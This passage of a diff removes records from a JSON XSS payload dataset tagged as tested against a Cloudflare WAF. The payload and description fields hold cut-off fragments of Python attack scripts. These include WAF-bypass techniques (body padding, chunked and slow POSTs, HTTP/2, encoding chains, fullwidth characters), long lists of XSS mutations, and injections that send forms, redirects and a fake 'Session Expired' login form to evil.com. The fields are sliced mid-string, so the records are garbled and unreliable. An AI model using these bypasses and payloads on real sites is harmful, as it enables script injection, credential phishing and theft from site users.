\"\n\")\n\n# WAF might have size limits on POST body inspection\nfor size in [1000, 4000, 8000, 16000, 32000, 64000, 100000, 128000]:\n    padding = \"x\" * size\n    payload = f'{padding}&attributeHtml=\" autofocus onfocus=alert(1) x=\"'\n    try:\n        r = requests.post(BASE, data=payload, verify=False, timeout=15,\n                          headers={\"Content-Type\": \"application/x-www-form-urlencoded\"})\n        blocked = r.status_code in (403, 406, 503)\n        status = \"BLOCK\" if blocked else f\"HTTP {r.status_code}\"\n\n        # Check for XSS\n        if not blocked and \"onfocus=\" in r.text.lower():\n            print(f\"  POST-pad-{size:>6d}                                       {status}  *** XSS ***\")\n            idx = r.text.find('<input')\n            if idx >= 0:\n                print(f\"    -> {r.text[idx:idx+200]}\")\n        else:\n            print(f\"  POST-pad-{size:>6d}                                       {status}\")\n    except Exception as e:\n        print(f\"  POST-pad-{size:>6d}                                       ERROR: {e}\")\n\n# Also try padding before globalHtml\nprint()\nfor size in [32000, 64000, 100000, 128000]:\n    padding = \"a=b&\" * (size // 4)\n    payload = f'{padding}globalHtml=<svg onload=alert(1)>'\n    try:\n        r = requests.post(BASE, data=payload, verify=False, timeout=15,\n                          headers={\"Content-Type\": \"application/x-www-form-urlencoded\"})\n        blocked = r.status_code in (403, 406, 503)\n        status = \"BLOCK\" if blocked else f\"HTTP {r.status_code}\"\n        if not blocked:\n            lower = r.text.lower()\n            if \"onload=\" in lower or \"<svg\" in lower:\n                print(f\"  POST-junk-params-{size:>6d}                            {status}  ** REFLECTED **\")\n            else:\n                print(f\"  POST-junk-params-{size:>6d}                            {status}\")\n        else:\n            print(f\"  POST-junk-params-{size:>6d}                            {status}\")\n    except Exception as e:\n        print(f\"  POST-junk-params-{size:>6d}                            ERROR: {e}\")\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"11C: Chunked Transfer Encoding POST\")\nprint(\"=\" * 70 + \"\n\")\n\nimport socket\nimport ssl\n\ndef raw_chunked_post(name, chunks):\n    \"\"\"Send a chunked POST with the payload split across chunks.\"\"\"\n    try:\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        sock = socket.create_connection((\"waf.cumulusfire.net\", 443), timeout=TIMEOUT)\n        ssock = ctx.wrap_socket(sock, server_hostname=\"waf.cumulusfire.net\")\n\n        # Build chunked body\n        chunked_body = b\"\"\n        for chunk in chunks:\n            chunk_bytes = chunk.encode() if isinstance(chunk, str) else chunk\n            chunked_body += f\"{len(chunk_bytes):x}\r\n\".encode()\n            chunked_body += chunk_bytes + b\"\r\n\"\n        chunked_body += b\"0\r\n\r\n\"\n\n        request = (\n            b\"POST / HTTP/1.1\r\n\"\n            b\"Host: waf.cumulusfire.net\r\n\"\n            b\"Content-Type: application/x-www-form-urlencoded\r\n\"\n            b\"Transfer-Encoding: chunked\r\n\"\n            b\"Connection: close\r\n\"\n            b\"\r\n\"\n        ) + chunked_body\n\n        ssock.sendall(request)\n        response = b\"\"\n        while True:\n            try:\n                data = ssock.recv(4096)\n                if not data:\n                    break\n                response += data\n            except socket.timeout:\n                break\n        ssock.close()\n\n        resp_str = response.decode(\"utf-8\", errors=\"replace\")\n        status_match = re.search(r'HTTP/\\d\\.\\d (\\d+)', resp_str)\n        status = int(status_match.group(1)) if status_match else 0\n        blocked = status in (403, 406, 503)\n\n        lower = resp_str.lower()\n        has_xss = any(kw in lower for kw in [\"onfocus=alert",
-      "description": "onclick=alert\",\n                                               \"onerror=alert\", \"onload=alert",
-      "technique": "direct_injection",
-      "source_file": "waf_round11.py",
       "tested_against": [
         "cloudflare_waf"
       ],
@@ -711,34 +599,6 @@
       "description": "<SVG/ONLOAD=alert(1)>', '<sVg/OnLoAd=alert(1)>',\n    '<svg /onload=alert(1)>', '<svg  /onload=alert(1)>', '<svg\\t/onload=alert(1)>',\n    '<svg/onload =alert(1)>', '<svg/onload= alert(1)>', '<svg/onload=alert (1)>',\n    '<svg/onload=alert( 1)>', '<svg/onload=alert(1 )>', '<svg/onload=alert(1)  >',\n    '<svg/ONLOAD=alert(1)>', '<svg/onLoad=alert(1)>', '<svg/OnLoad=alert(1)>',\n    '<svg/onload=alert(1)/>', '<svg/onload=alert(1) />', '<svg onload=alert(1)//>',\n    '<svg\\x0conload=alert(1)>', '<svg\\x09onload=alert(1)>', '<svg\\x0aonload=alert(1)>',\n    '<svg\\x0donload=alert(1)>',\n    '<svg/onload=alert(1)>', '<svg /onload=alert(1)>',\n    '< svg/onload=alert(1)>', '<svg/ onload=alert(1)>',\n    '<svg/onload=alert(+1)>', '<svg/onload=alert(-1)>', '<svg/onload=alert(~1)>',\n    '<svg/onload=alert(!1)>', '<svg/onload=alert(void 0)>',\n    '<svg/onload=alert(1,2)>', '<svg/onload=alert(1);>',\n    '<svg/onload=alert(1)//>', '<svg/onload=alert(1)/**//>',\n]\n\nimg_mutations = [\n    '<img src=x onerror=alert(1)>', '<img/src=x/onerror=alert(1)>',\n    '<IMG SRC=x ONERROR=alert(1)>', '<ImG sRc=x OnErRoR=alert(1)>',\n    '<img src=\"x\" onerror=\"alert(1)\">', \"<img src='x' onerror='alert(1)'>\",\n    '<img src=x onerror=alert(1) />', '<img src=x onerror=alert(1)///>',\n    '<img src=xx onerror=alert(1)>', '<img src=. onerror=alert(1)>',\n    '<img src=/ onerror=alert(1)>', '<img src=// onerror=alert(1)>',\n    '<img src=1 onerror=alert(1)>', '<img src=\"\" onerror=alert(1)>',\n    '<img src onerror=alert(1)>', '<img/src/onerror=alert(1)>',\n    '<img src=x\\tonerror=alert(1)>', '<img src=x\\nonerror=alert(1)>',\n    '<img src=x\\ronerror=alert(1)>',\n]\n\nscript_mutations = [\n    '<script>alert(1)</script>', '<SCRIPT>alert(1)</SCRIPT>',\n    '<Script>alert(1)</Script>', '<sCrIpT>alert(1)</ScRiPt>',\n    '<script >alert(1)</script>', '<script\\t>alert(1)</script>',\n    '<script\\n>alert(1)</script>', '<script\\r>alert(1)</script>',\n    '<script/>alert(1)</script>', '<script >alert(1)</script >',\n    '<scr\\x00ipt>alert(1)</script>', '<scri\\x00pt>alert(1)</script>',\n]\n\n# Additional creative mutations\ncreative_mutations = [\n    # Null bytes inside tags\n    '<sv\\x00g/onload=alert(1)>', '<im\\x00g src=x onerror=alert(1)>',\n    # Comment injection\n    '<svg/on<!---->load=alert(1)>', '<img src=x on<!---->error=alert(1)>',\n    # Backtick variations\n    '<svg/onload=alert`1`>', '<img src=x onerror=alert`1`>',\n    '<svg/onload=confirm`1`>', '<svg/onload=prompt`1`>',\n    # Template literals\n    '<svg/onload=alert`${1}`>', '<svg/onload=${alert(1)}>',\n    # Object/array tricks\n    '<svg/onload=[alert(1)]>', '<svg/onload={alert:alert(1)}>',\n    # Comma operator\n    '<svg/onload=1,alert(1)>', '<svg/onload=void(alert(1))>',\n    # Arrow functions\n    '<svg/onload=(()=>alert(1))()>', '<svg/onload=(x=>alert(1))()>',\n    # With\n    '<svg/onload=with(document)alert(1)>',\n    # Various quote escapes\n    '\"><svg/onload=alert(1)><\"', \"'><svg/onload=alert(1)><'\",\n    '``><svg/onload=alert(1)>', '//><svg/onload=alert(1)>',\n]\n\nall_mutations = svg_mutations + img_mutations + script_mutations + creative_mutations\n\nfor payload in all_mutations:\n    enc = urllib.parse.quote(payload)\n    # GET\n    s, b, x, sn = test_get(f\"globalHtml={enc}",
       "technique": "mutation",
       "source_file": "waf_round68_mass.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0221",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "\n\" + \"=\" * 75)\nprint(\"29A: SVG <use> with External href\")\nprint(\"=\" * 75 + \"\n\")\n\n# <svg><use href=\"//evil/payload.svg#x\"> loads external SVG\n# which can contain onload handlers in the external file\nuse_tests = {\n    \"sc-use-href\": {\"attributeHtml\": '\"/><svg><use href=//evil.com/x.svg#y'},\n    \"sc-use-xlink\": {\"attributeHtml\": '\"/><svg><use xlink:href=//evil.com/x.svg#y'},\n    \"html-use-href\": {\"globalHtml\": '<svg><use href=\"//evil.com/x.svg#y\"></use></svg>'},\n    \"html-use-xlink\": {\"globalHtml\": '<svg><use xlink:href=\"//evil.com/x.svg#y\"></use></svg>'},\n    # Without SVG wrapper\n    \"sc-use-bare\": {\"attributeHtml\": '\"/><use href=//evil.com/x.svg#y'},\n    # With data: URI\n    \"sc-use-data\": {\"attributeHtml\": '\"/><svg><use href=\"data:image/svg+xml,<svg><script>alert(1)</script></svg>#x'},\n}\n\nfor name, payload in use_tests.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29B: <object> with data= Attribute\")\nprint(\"=\" * 75 + \"\n\")\n\nobject_tests = {\n    \"sc-object-data\": {\"attributeHtml\": '\"/><object data=//evil.com'},\n    \"sc-object-data-html\": {\"attributeHtml\": '\"/><object data=\"data:text/html,test\"'},\n    \"html-object-data\": {\"globalHtml\": '<object data=\"//evil.com\">'},\n    \"html-object-type\": {\"globalHtml\": '<object type=\"text/html\" data=\"//evil.com\">'},\n    # <embed> \n    \"sc-embed-src\": {\"attributeHtml\": '\"/><embed src=//evil.com'},\n    \"html-embed-src\": {\"globalHtml\": '<embed src=\"//evil.com\">'},\n}\n\nfor name, payload in object_tests.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29C: <base> Tag Hijack\")\nprint(\"=\" * 75 + \"\n\")\n\n# <base> changes the base URL for all relative links on the page\nbase_tests = {\n    \"sc-base-href\": {\"attributeHtml\": '\"/><base href=//evil.com/'},\n    \"sc-base-target\": {\"attributeHtml\": '\"/><base target=_blank'},\n    \"html-base-href\": {\"globalHtml\": '<base href=\"//evil.com/\">'},\n    \"html-base-https\": {\"globalHtml\": '<base href=\"https://evil.com/\">'},\n}\n\nfor name, payload in base_tests.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29D: Input Type Manipulation (Change Input Behavior)\")\nprint(\"=\" * 75 + \"\n\")\n\n# Can we change the input's type to something that auto-submits or navigates?\ninput_type_tests = {\n    \"type-url\": {\"attributeHtml\": '\" type=url value=javascript:alert(1) x=\"'},\n    \"type-submit\": {\"attributeHtml\": '\" type=submit value=Click x=\"'},\n    \"type-image\": {\"attributeHtml\": '\" type=image src=//evil.com x=\"'},\n    \"type-button\": {\"attributeHtml\": '\" type=button value=Click x=\"'},\n    \"type-reset\": {\"attributeHtml\": '\" type=reset value=Reset x=\"'},\n    \"type-file\": {\"attributeHtml\": '\" type=file accept=*.* x=\"'},\n    # formaction with external URL (not javascript:)\n    \"fa-external\": {\"attributeHtml\": '\" type=submit formaction=//evil.com x=\"'},\n    \"fa-external-https\": {\"attributeHtml\": '\" type=submit formaction=https://evil.com x=\"'},\n    # formaction with data: URI\n    \"fa-data\": {\"attributeHtml\": '\" type=submit formaction=\"data:text/html,test\" x=\"'},\n}\n\nfor name, payload in input_type_tests.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29E: <a> Tag Injection with href\")\nprint(\"=\" * 75 + \"\n\")\n\n# Can we inject an <a> tag with href via self-close?\na_tests = {\n    \"sc-a-href-evil\": {\"attributeHtml\": '\"/><a href=//evil.com>Click'},\n    \"sc-a-href-js\": {\"attributeHtml\": '\"/><a href=javascript:alert(1)>Click'},\n    \"sc-a-href-data\": {\"attributeHtml\": '\"/><a href=\"data:text/html,<script>alert(1)</script>\">Click'},\n    # Entity-encoded javascript: in href\n    \"sc-a-href-jsentity\": {\"attributeHtml\": '\"/><a href=\"&#106;avascript:alert(1)\">Click'},\n    \"sc-a-href-jshex\": {\"attributeHtml\": '\"/><a href=\"&#x6a;avascript:alert(1)\">Click'},\n    # With tab/newline in javascript:\n    \"sc-a-href-jstab\": {\"attributeHtml\": '\"/><a href=\"java\tscript:alert(1)\">Click'},\n    # Plain external URL\n    \"sc-a-href-ext\": {\"attributeHtml\": '\"/><a href=https://evil.com>Click'},\n}\n\nfor name, payload in a_tests.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29F: <form> Tag Injection\")\nprint(\"=\" * 75 + \"\n\")\n\nform_tests = {\n    \"sc-form-action\": {\"attributeHtml\": '\"/><form action=//evil.com><input type=submit value=Click'},\n    \"sc-form-action-js\": {\"attributeHtml\": '\"/><form action=javascript:alert(1)><input type=submit'},\n    \"sc-form-bare\": {\"attributeHtml\": '\"/><form action=//evil.com'},\n    # Form with method=GET\n    \"sc-form-get\": {\"attributeHtml\": '\"/><form method=GET action=//evil.com'},\n}\n\nfor name, payload in form_tests.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29G: <meta> Redirect\")\nprint(\"=\" * 75 + \"\n\")\n\nmeta_tests = {\n    \"sc-meta-refresh\": {\"attributeHtml\": '\"/><meta http-equiv=refresh content=\"0;url=//evil.com\"'},\n    \"sc-meta-refresh2\": {\"attributeHtml\": '\"/><meta http-equiv=\"refresh\" content=\"1;url=https://evil.com\"'},\n    \"html-meta-refresh\": {\"globalHtml\": '<meta http-equiv=\"refresh\" content=\"0;url=//evil.com\">'},\n    # Entity-encoded\n    \"sc-meta-ent\": {\"attributeHtml\": '\"/><meta http-equiv=refresh content=\"0;url=&#106;avascript:alert(1)\"'},\n}\n\nfor name, payload in meta_tests.items():\n    t(name, payload)\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29H: Slow/Timed Requests\")\nprint(\"=\" * 75 + \"\n\")\n\n# Some WAFs timeout on slow requests and skip inspection\nprint(\"  Testing slow POST (sending body over 10 seconds)...\")\nimport socket\nimport ssl\n\ntry:\n    ctx = ssl.create_default_context()\n    ctx.check_hostname = False\n    ctx.verify_mode = ssl.CERT_NONE\n    sock = socket.create_connection((\"waf.cumulusfire.net\", 443), timeout=30)\n    ssock = ctx.wrap_socket(sock, server_hostname=\"waf.cumulusfire.net\")\n    \n    body = b\"globalHtml=%3Csvg%2Fonload%3Dalert(1)%3E\"\n    headers = (\n        b\"POST / HTTP/1.1\r\n\"\n        b\"Host: waf.cumulusfire.net\r\n\"\n        b\"Content-Type: application/x-www-form-urlencoded\r\n\"\n        b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n        b\"Connection: close\r\n\r\n\"\n    )\n    \n    # Send headers quickly\n    ssock.sendall(headers)\n    \n    # Send body one byte at a time with 1-second delays\n    for i, byte_val in enumerate(body):\n        time.sleep(0.5)\n        ssock.sendall(bytes([byte_val]))\n    \n    # Read response\n    response = b\"\"\n    while True:\n        try:\n            d = ssock.recv(4096)\n            if not d: break\n            response += d\n        except: break\n    ssock.close()\n    \n    resp_str = response.decode(\"utf-8\", errors=\"replace\")\n    status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n    status = int(status_m.group(1)) if status_m else 0\n    blocked = status in (403, 406, 503)\n    \n    if not blocked and 'onload=' in resp_str.lower():\n        print(f\"  *** SLOW REQUEST BYPASS: HTTP {status} ***\")\n        found.append(\"slow-request\")\n    else:\n        print(f\"  Slow request: HTTP {status} {'BLOCK' if blocked else 'no reflection'}\")\nexcept Exception as e:\n    print(f\"  Slow request error: {e}\")\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"29I: Final Hail Mary — Combining ALL Passes\")\nprint(\"=\" * 75 + \"\n\")\n\n# The most impactful thing we can do with what passes:\n# 1. Attribute breakout to add form= and type=submit -> phishing\n# 2. Self-close to inject <details popover> -> UI manipulation\n# 3. data-* attributes -> if page JS reads them, potential DOM XSS\n\n# Check: can we make the existing input a submit button pointing to external?\nt(\"phish-submit-ext\", {\"attributeHtml\": '\" type=submit formaction=//evil.com value=Login x=\"'})\nt(\"phish-submit-https\", {\"attributeHtml\": '\" type=submit formaction=https://evil.com/phish value=Login x=\"'})\n\n# Can we inject a complete phishing form?\nt(\"phish-form-complete\", {\n    \"globalHtml\": '<h2>Session Expired - Please Login Again</h2>",
-      "description": "attributeHtml\": '\" type=password placeholder=Password x=\"'\n})\n\n# Can we redirect with meta?\nt(\"redirect-meta\", {\"globalHtml\": '<meta http-equiv=\"refresh\" content=\"0;url=https://evil.com\">'})\n\n# Can we inject an image from external?\nt(\"external-img\", {\"attributeHtml\": '\"/><img src=https://evil.com/track.gif'})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"ROUND 29 — FINAL SUMMARY",
-      "technique": "direct_injection",
-      "source_file": "waf_round29_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0224",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "value=\"')\n                if idx > 0:\n                    print(f\"    VAL: {body[idx:idx+200]}\")\n            return True\n        else:\n            print(f\"  {name:60s} BLOCK\")\n            return False\n    except Exception as e:\n        print(f\"  {name:60s} ERR: {e}\")\n        return False\n\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"44A: Self-Close Breakout + Gap on Tags (POST Only)\")\nprint(\"=\" * 80 + \"\n\")\n\n# We know on{load passes in POST attributeHtml.\n# Does self-close + tag + gap event pass in POST?\n\nsc_gap_payloads = {\n    # Self-close + svg + gap event\n    \"sc-svg-on{load-POST\": ('\"/><svg on{load=alert(1)>",
-      "description": "POST",
-      "technique": "direct_injection",
-      "source_file": "waf_round44_browser_quirk.py",
       "tested_against": [
         "cloudflare_waf"
       ],
@@ -928,20 +788,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0296",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": ":authority',HOST)]\n            conn.send_headers(1, headers, end_stream=True); ssock.sendall(conn.data_to_send())\n            resp_status = 0\n            dl = time.time() + TIMEOUT\n            while time.time() < dl:\n                try:\n                    ssock.settimeout(max(0.3, dl - time.time()))\n                    data = ssock.recv(65535)\n                    if not data: break\n                    events = conn.receive_data(data)\n                    for ev in events:\n                        if hasattr(ev, 'headers'):\n                            for h in ev.headers:\n                                if h[0] == b':status': resp_status = int(h[1])\n                        elif hasattr(ev, 'data'):\n                            conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)\n                    ssock.sendall(conn.data_to_send())\n                    if any(type(e).__name__ == 'StreamEnded' for e in events): break\n                except: break\n            ssock.close()\n            if resp_status in (403, 406, 503): blocked += 1\n            else: passed += 1\n        except: errors += 1\n\n    H2_RESEARCH = [\n        '<svg on onload=(alert)(document.domain)>",
-      "description": "<svg onx=() onload=window.alert?.()>',\n        '<img oNLy=1 src=x oNErrOR=prompt`1`//>',\n        '<Img/Src/OnError=(alert)(1)>',\n        '<img//////src=x oNlY=1 oNerror=alert(\"xss",
-      "technique": "direct_injection",
-      "source_file": "waf_round92_research2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0297",
       "category": "xss",
       "subcategory": "svg_based",
@@ -984,20 +830,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0319",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "toString\"](36)](1)>')\n\n# Also try with different functions\ntry: confirm_b36 = int('confirm', 36)\nexcept: confirm_b36 = 0\ntry: prompt_b36 = int('prompt', 36)\nexcept: prompt_b36 = 0\n\nif confirm_b36:\n    TS36_PAYLOADS.append(f'<svg/onload=top[{confirm_b36}..toString(36)](1)>')\nif prompt_b36:\n    TS36_PAYLOADS.append(f'<svg/onload=top[{prompt_b36}..toString(36)](1)>')\n\nfor p in TS36_PAYLOADS:\n    test(p)\nprint(f\"  toString(36) done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- D: Destructuring + Template Literal (Imperva technique) ---\")\n\nDESTRUCT = [\n    # Variable destructuring to build 'alert'\n    \"{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/1/.source)",
-      "description": "{var{0:a,1:l,2:e,3:r,4:t}='alert'}window[a+l+e+r+t](1)\",\n    \"{let[a,l,e,r,t]='alert'}window[a+l+e+r+t](1)\",\n    # Template literal location redirect\n    \"location=`javas`+`cript:ale`+`rt(1)`\",\n    \"location=`javas`+`cript:con`+`firm(1)`\",\n    \"location=`javas`+`cript:pro`+`mpt(1)`\",\n    # String.fromCharCode\n    \"self[String.fromCharCode(97,108,101,114,116)](1)\",\n    \"top[String.fromCharCode(97,108,101,114,116)](1)\",\n    \"window[String.fromCharCode(97,108,101,114,116)](1)\",\n    # Computed property access\n    \"self['al'+'ert",
-      "technique": "direct_injection",
-      "source_file": "waf_round76_cross2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0320",
       "category": "xss",
       "subcategory": "svg_based",
@@ -1019,34 +851,6 @@
       "description": "<img src=x onerror=[][\"filter",
       "technique": "direct_injection",
       "source_file": "waf_round76_cross2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0323",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "{B64_PAYLOAD}\"))</script>',\n    f'<img src=x onerror=eval(atob(\"{B64_PAYLOAD}\"))>',\n    f'<svg/onload=eval(atob(\"{B64_PAYLOAD}\"))>',\n]\n\nfor ct in CTS:\n    for p in CT_PAYLOADS:\n        post(p, ct=ct)\n\nprint(f\"  Content-Type abuse done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- G: Encoding Chain Combos ---\")\n\nCHAIN_BASES = [\n    '<svg/onload=alert(1)>",
-      "description": "<img src=x onerror=alert(1)>',\n    '<script>alert(1)</script>',\n]\n\nfor p in CHAIN_BASES:\n    b64 = base64.b64encode(p.encode()).decode()\n    \n    # Base64 → URL encode\n    get(urllib.parse.quote(b64))\n    # URL encode → Base64\n    url_first = urllib.parse.quote(p)\n    get(base64.b64encode(url_first.encode()).decode())\n    # Base64 → HTML entity\n    b64_ent = ''.join(f'&#{ord(c)};' for c in b64)\n    get(b64_ent)\n    # HTML entity → Base64\n    ent_first = ''.join(f'&#{ord(c)};' for c in p)\n    get(base64.b64encode(ent_first.encode()).decode())\n    # Base64 → hex\n    get(b64.encode().hex())\n    # Hex → Base64\n    get(base64.b64encode(p.encode().hex().encode()).decode())\n    # Base64 → unicode escape\n    uni = ''.join(f'\\\\u{ord(c):04x}' for c in b64)\n    get(uni)\n\nprint(f\"  Encoding chains done: {total} total",
-      "technique": "encoding",
-      "source_file": "waf_round76_cross2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0325",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "value=\"\"' not in inp and 'value=\"\"' in body)):\n                print(f\"    DIV: {div_c[:150]}\")\n                if inp:\n                    print(f\"    INP: {inp[:150]}\")\n        else:\n            print(f\"  {name:60s} BLOCK\")\n    except Exception as e:\n        print(f\"  {name:60s} ERROR: {e}\")\n\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"20A: Xib3rR4dAr Exact Payloads — HTML Context\")\nprint(\"=\" * 75 + \"\n\")\n\nxib3r_html = {\n    # BruteLogic bypass\n    \"xib-brutelogic\": '<Svg Only=1 OnLoad=confirm(1)>',\n    # Troll_13 bypass\n    \"xib-troll13\": '<svg/oni=on onload=confirm(2)>',\n    # When > present later\n    \"xib-no-close\": '<svg oni=on onload=alert(1)//',\n    # Custom tag with ondrag\n    \"xib-custom-tag\": '<o oni=on ondrag=alert(1)>Drag Me',\n    # Variations\n    \"xib-svg-only-onload\": '<Svg Only=1 OnLoad=alert(1)>",
-      "description": "xib-svg-oni-onload\": '<svg/oni=on onload=alert(1)>',\n}\n\nfor name, payload in xib3r_html.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"20B: Xib3rR4dAr Exact Payloads — Attribute Context",
-      "technique": "direct_injection",
-      "source_file": "waf_round20_xib3r.py",
       "tested_against": [
         "cloudflare_waf"
       ],
@@ -1236,20 +1040,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0352",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "content-length',str(len(body)))], body=body)\n\nexcept Exception as e:\n    print(f\"  H2 error: {e}\")\n\n# C: Remaining GET attr breakouts with all funcs\nfor func in FUNCS:\n    attr = f'\" onfocus={func} autofocus x=\"'\n    get(attr, param=\"attributeHtml\")\n\n# D: JSON with all remaining tag×func\nfor tag, suffix in TAGS[:3]:\n    for func in FUNCS[:6]:\n        p = f'{tag}{func}{suffix}'\n        body = json.dumps({\"globalHtml\": p}).encode()\n        raw_req(\n            b\"POST / HTTP/1.1\r\nHost: \" + HOST.encode() + b\"\r\n\"\n            b\"Content-Type: application/json\r\n\"\n            b\"Content-Length: \" + str(len(body)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\" + body, \"json-final\")\n\n# E: Multipart with all funcs in svg tag\nfor func in FUNCS:\n    p = f'<svg/onload={func}>'\n    bound = \"fmpbound\"\n    body = f\"--{bound}\r\nContent-Disposition: form-data; name=\\\"globalHtml\\\"\r\n\r\n{p}\r\n--{bound}--\r\n\".encode('utf-8",
-      "description": "replace",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_push.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
       "id": "xss-0354",
       "category": "xss",
       "subcategory": "svg_based",
@@ -1353,20 +1143,6 @@
       "subcategory": "svg_based",
       "payload": "\n\" + \"=\" * 80)\nprint(\"47D: Korean/Chinese Characters Wrapping XSS\")\nprint(\"=\" * 80 + \"\n\")\n\ncjk_payloads = {\n    # Korean\n    \"kr-wrap\": '테스트<svg/onload=alert(1)>테스트",
       "description": "kr-long\": '한' * 1000 + '<svg/onload=alert(1)>',\n    \"kr-mixed\": '안녕하세요<img src=x onerror=alert(1)>감사합니다',\n    \n    # Chinese Simplified\n    \"cn-wrap\": '测试<svg/onload=alert(1)>测试',\n    \"cn-long\": '中' * 1000 + '<svg/onload=alert(1)>',\n    \"cn-mixed\": '你好世界<img src=x onerror=alert(1)>谢谢',\n    \n    # Chinese Traditional\n    \"tw-wrap\": '測試<svg/onload=alert(1)>測試',\n    \"tw-long\": '國' * 1000 + '<svg/onload=alert(1)>',\n    \n    # CJK Unified Ideographs Extension\n    \"cjk-ext-a\": '\\u3400' * 100 + '<svg/onload=alert(1)>',\n    \"cjk-ext-b\": '\\U00020000' * 50 + '<svg/onload=alert(1)>',\n    \n    # Korean Jamo (decomposed Hangul)\n    \"kr-jamo\": 'ㅎㅏㄴ' * 100 + '<svg/onload=alert(1)>',\n}\n\nfor name, payload in cjk_payloads.items():\n    t(name, {\"globalHtml\": payload})\n    time.sleep(0.15)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 80)\nprint(\"47E: Fullwidth 'onload', 'onerror' etc. (Entire Event Name)",
-      "technique": "direct_injection",
-      "source_file": "waf_round47_cjk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "xss-0365",
-      "category": "xss",
-      "subcategory": "svg_based",
-      "payload": "=\" * 80 + \"\n\")\n\n# Fullwidth Latin: a=\\uff41, b=\\uff42, ..., z=\\uff5a\n# A=\\uff21, B=\\uff22, ..., Z=\\uff3a\ndef to_fullwidth(s):\n    result = ''\n    for c in s:\n        if 'a' <= c <= 'z':\n            result += chr(ord(c) - ord('a') + 0xff41)\n        elif 'A' <= c <= 'Z':\n            result += chr(ord(c) - ord('A') + 0xff21)\n        elif '0' <= c <= '9':\n            result += chr(ord(c) - ord('0') + 0xff10)\n        elif c == '=':\n            result += '\\uff1d'\n        elif c == '(':\n            result += '\\uff08'\n        elif c == ')':\n            result += '\\uff09'\n        elif c == '<':\n            result += '\\uff1c'\n        elif c == '>':\n            result += '\\uff1e'\n        elif c == '/':\n            result += '\\uff0f'\n        elif c == '\"':\n            result += '\\uff02'\n        elif c == ' ':\n            result += '\\u3000'\n        else:\n            result += c\n    return result\n\nfw_event_payloads = {\n    # Fullwidth event name only\n    \"fw-onload-name\": f'<svg/{to_fullwidth(\"onload\")}=alert(1)>",
-      "description": "fw-onerror-name\": f'<img src=x {to_fullwidth(\"onerror",
       "technique": "direct_injection",
       "source_file": "waf_round47_cjk.py",
       "tested_against": [
@@ -1558,20 +1334,6 @@
       "blocked": true
     },
     {
-      "id": "xss-0418",
-      "category": "xss",
-      "subcategory": "svg_based",
